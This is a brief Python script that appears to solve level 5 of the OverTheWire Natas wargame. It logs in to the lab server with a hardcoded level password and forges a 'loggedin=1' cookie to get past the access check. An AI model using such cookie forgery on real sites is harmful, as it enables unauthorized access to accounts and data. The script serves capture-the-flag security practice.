import requests

cookies = dict(loggedin='1')

r = requests.get(
    'http://natas5.natas.labs.overthewire.org',
    auth=('natas5', '0n35PkggAPm2zbEpOU802c0x0Msn1ToK'),
    cookies=cookies
)
print(r.text)

